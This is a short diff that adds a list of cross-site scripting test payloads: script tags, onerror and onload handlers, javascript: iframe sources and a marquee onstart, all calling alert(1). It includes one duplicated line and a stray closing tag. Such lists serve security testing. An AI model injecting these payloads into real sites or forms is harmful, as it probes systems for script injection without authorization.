@@ -1,0 +1,11 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<button onclick="alert(1)">Click Me</button>
+<input type="text" value="<script>alert(1)</script>">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<button onclick="alert(1)">Click Me</button>
+</button>
+<marquee onstart=alert(1)>Hello</marquee>
+<iframe src="javascript:alert(1)"></iframe>
